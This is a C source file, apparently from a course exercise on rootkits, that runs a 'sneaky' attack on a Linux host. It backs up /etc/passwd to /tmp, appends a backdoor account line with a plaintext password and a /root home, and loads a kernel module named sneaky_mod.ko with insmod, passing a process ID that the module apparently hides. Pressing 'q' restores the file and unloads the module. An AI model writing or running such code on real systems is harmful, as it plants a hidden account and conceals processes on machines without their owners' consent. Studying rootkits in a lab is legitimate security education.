#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

void copyFile(const char* from_dir, const char* to_dir){
  // get some reference from
  // https://www.geeksforgeeks.org/c-program-copy-contents-one-file-another-file/
  FILE *from, *to;
  from = fopen(from_dir, "r");
  if (from == NULL) {
      printf("Cannot open file %s \n", from_dir);
      exit(1);
  }
  to = fopen(to_dir, "w");
  if (to == NULL) {
      printf("Cannot open file %s \n", to_dir);
      exit(1);
  }
  char c = fgetc(from);
  while (c != EOF){
      fputc(c, to);
      c = fgetc(from);
  }
  //printf("copy finished\n");
  fclose(from);
  fclose(to);
}

void add_line(const char* f){
  FILE *file = fopen(f, "a");
  if (file == NULL) {
      printf("Cannot open file to add a line. Use SUDO\n");
      exit(1);
  }
  fprintf(file,"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(file);
}
void sneakyModule(int load){
  //"sneaky_mod.ko"
  pid_t cpid = fork();
  int status;
  if (cpid == -1) {
    perror("fork");
    exit(EXIT_FAILURE);
  }
  else if(cpid == 0){
    if(load == 1){
      //load
      pid_t parent_pid = getppid();
      char parent_pid_str[32];
      sprintf(parent_pid_str,"process_id=%d", (int)parent_pid);
      execl("/sbin/insmod", "insmod", "sneaky_mod.ko", parent_pid_str, (char*)0);
    }
    else{
      execl("/sbin/rmmod", "rmmod", "sneaky_mod.ko", (char *)0);
    }
  }
  else{
    //parent process
    int w = waitpid(cpid, &status, 0);
    if (w == -1) {
      perror("waitpid");
      exit(EXIT_FAILURE);
    }
  }
}

void moveFile_add(const char* from_dir, const char* to_dir){
  copyFile(from_dir, to_dir);
  add_line(from_dir);
}

int main(){
  //step 1
  printf("sneaky_process pid = %d\n", getpid());

  //step2: copy the passwd file and print a new line to the end of it
  //sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
  const char* old_dir = "/etc/passwd";
  const char* new_dir = "/tmp/passwd";
  moveFile_add(old_dir, new_dir);


  sneakyModule(1);

  while(getchar()!='q'){
    //do nothing
  }
  //printf("quited loop");
  

  //restore file
  copyFile(new_dir, old_dir);
  
  sneakyModule(0); //unload
  
  //printf("Finished!");
  return 0;
}
